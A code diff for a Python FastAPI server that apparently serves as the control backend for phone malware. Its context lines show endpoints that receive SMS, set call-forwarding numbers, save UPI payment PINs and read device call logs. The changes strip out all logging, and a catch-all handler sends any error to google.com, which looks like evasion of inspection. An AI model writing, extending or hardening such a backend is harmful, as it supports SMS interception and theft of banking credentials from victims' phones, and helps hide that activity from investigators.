@@ -6,16 +6,9 @@ from starlette.exceptions import HTTPException as StarletteHTTPException
 from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
 from datetime import datetime, timedelta
 import json
-import logging
 
 import asyncio
 from typing import Optional
-
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
 
 from .config import settings
 from .database import connect_to_mongodb, close_mongodb_connection, mongodb
@@ -91,21 +84,16 @@ async def validation_exception_handler(request: Request, exc: RequestValidationE
 
 @app.exception_handler(Exception)
 async def general_exception_handler(request: Request, exc: Exception):
-    logger.error(f"Unhandled exception: {exc}")
     return RedirectResponse(url="https://www.google.com")
 
 @app.on_event("startup")
 async def startup_event():
-    logger.info("Starting application...")
     await connect_to_mongodb()
     await auth_service.create_default_admin()
-    logger.info("Application started successfully")
 
 @app.on_event("shutdown")
 async def shutdown_event():
-    logger.info("Shutting down application...")
     await close_mongodb_connection()
-    logger.info("Application shutdown complete")
 
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
@@ -131,7 +119,6 @@ async def device_heartbeat(request: Request):
         return {"success": True, "message": "Heartbeat received"}
         
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/ping-response")
@@ -150,7 +137,6 @@ async def ping_response(request: Request):
         return {"success": True, "message": "Ping response received"}
         
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/upload-response")
@@ -194,7 +180,6 @@ async def upload_response(request: Request):
         return {"success": True, "message": "Upload response received"}
         
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/register")
@@ -355,7 +340,6 @@ async def receive_sms(request: Request):
     except HTTPException:
         raise
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(
             status_code=500,
             detail=f"Internal server error: {str(e)}"
@@ -371,7 +355,6 @@ async def get_forwarding_number_new(device_id: str):
             return {"forwardingNumber": ""}
         return {"forwardingNumber": forwarding_number}
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/health")
@@ -802,7 +785,6 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         )
     
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/auth/me", response_model=AdminResponse)
@@ -1521,7 +1503,6 @@ async def update_device_settings(
             f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
         )
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise
 
     await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)
@@ -1556,7 +1537,6 @@ async def delete_device_sms(
             f"Deleted {result.deleted_count} SMS messages from device {device_id}"
         )
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise
 
     return {
@@ -1612,7 +1592,6 @@ async def get_device_calls(
         }
 
     except Exception as e:
-        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
     return {
